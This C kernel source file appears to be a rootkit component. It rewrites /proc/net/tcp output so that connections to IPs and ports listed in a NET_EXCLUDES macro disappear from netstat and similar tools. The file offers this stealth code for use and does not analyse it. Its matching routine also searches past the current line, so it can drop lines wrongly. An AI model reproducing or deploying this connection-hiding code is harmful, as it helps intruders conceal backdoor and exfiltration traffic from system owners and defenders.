#include "utils/excludes/ip_filtering.h"

void ip_to_hex(const char *ip_str, char *hex_buf) {
    u32 ip = in_aton(ip_str);
    sprintf(hex_buf, "%02X%02X%02X%02X",
            (ip >> 0) & 0xFF,
            (ip >> 8) & 0xFF,
            (ip >> 16) & 0xFF,
            (ip >> 24) & 0xFF);
}

void port_to_hex(unsigned int port, char *hex_buf) {
    sprintf(hex_buf, "%04X", port);
}

int should_exclude_line(const char *line) {
    if (NET_EXCLUDES[0] == '\0') { // NET_EXCLUDES WAS NOT SET
        return 0;
    } 

    char excludes[] = NET_EXCLUDES;  // copy macro to a mutable array
    char *token;
    char *temp_excludes = excludes;
    char search_str[16];

    while ((token = strsep(&temp_excludes, ",")) != NULL) {
        if (*token == '\0') { // might happen due to a misplaced comma
            continue;
        }
        if (strchr(token, '.')) { // ip contains ".", otherwise port
            char ip_hex[9];  // 8 hex digits + null terminator
            ip_to_hex(token, ip_hex);  // convert IP (e.g., "127.0.0.1") to hex (e.g., "0100007F")
            snprintf(search_str, sizeof(search_str), "%s:", ip_hex); // add ":" postfix to indicate ip
        } else {
            unsigned int port = simple_strtoul(token, NULL, 10);
            char port_hex[5];  // 4 hex digits + null terminator
            port_to_hex(port, port_hex);
            snprintf(search_str, sizeof(search_str), ":%s", port_hex); // add ":" prefix to indicate port
        }
        if (strnstr(line, search_str, strlen(line)) != NULL) {
            return 1;
        }
    }
    return 0;
}

/*
 * filter_netstat_lines - Filter out lines from a netstat output buffer (from /proc/net/tcp)
 * that contain any of the IPs or PORTS defined in the global NET_EXCLUDES macro.
 */
char *filter_netstat_lines(const char *buf, size_t *new_len) {
    size_t buf_len = strlen(buf);
    char *new_buf;
    size_t out_index = 0;
    const char *line_start = buf;
    const char *line_end;

    new_buf = kmalloc(buf_len + 1, GFP_KERNEL);
    if (!new_buf) {
        return NULL;
    }
    while (line_start < buf + buf_len) {
        line_end = strchr(line_start, '\n');
        if (!line_end) {
            line_end = buf + buf_len;
        }
        {
            size_t line_len = line_end - line_start;
            bool skip_line = false;

            if (should_exclude_line(line_start)) {
                skip_line = true;
            }

            if (!skip_line) {
                memcpy(new_buf + out_index, line_start, line_len);
                out_index += line_len;
                if (*line_end == '\n')
                    new_buf[out_index++] = '\n';
            }
        }
        if (*line_end == '\n') {
            line_start = line_end + 1;
        }
        else {
            break;
        }
    }
    new_buf[out_index] = '\0';
    if (new_len) {
        *new_len = out_index;
    }
    return new_buf;
}
